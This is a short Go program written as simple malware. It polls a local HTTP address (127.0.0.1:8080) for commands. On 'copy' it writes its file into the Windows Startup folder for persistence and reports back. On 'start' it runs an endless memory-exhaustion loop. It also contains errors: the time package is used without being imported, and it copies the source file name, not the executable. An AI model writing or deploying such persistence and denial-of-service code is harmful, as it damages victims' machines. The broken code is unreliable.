package main

import (
	"fmt"
	"os"
	"net/http"
	"log"
	"io/ioutil"
	"path/filepath"
	"runtime"
)

func ErrCheck(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func copy_to() string {
	winDir := os.Getenv("ProgramData")
	if winDir == "" {
		return "Failed to find the correct path."
	}
	startup := filepath.Join(winDir, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	_, file, _, _ := runtime.Caller(0)
	src := filepath.Base(file)
	dest := startup+"\\"+src
	bytesRead, err := ioutil.ReadFile(src)
	ErrCheck(err)
	err = ioutil.WriteFile(dest, bytesRead, 0644)
	ErrCheck(err)
	fmt.Println("Looks perfect I think?")
	return "Everything looks okay =)"
}

func start() {
	i := 10_000_000
	count := 0
	for {
		vir := make([]int, i)
		if count == 10000 {
			time.Sleep(3 * time.Second)
			count = 0
			fmt.Println(vir)
		}
		count += 1
		i*=2
	}
}

func main() {
	for {
		res, err := http.Get("http://127.0.0.1:8080/")
		ErrCheck(err)
		defer res.Body.Close()

		body, err := ioutil.ReadAll(res.Body)
		ErrCheck(err)
		sbody := string(body)
		if sbody == "copy" {
			http.Get("http://127.0.0.1:8080/?resp="+copy_to())
		} else if sbody == "exit" {
			fmt.Println("Exit command performed!")
			break
		} else if sbody == "start" {
			start()
		}
	}
}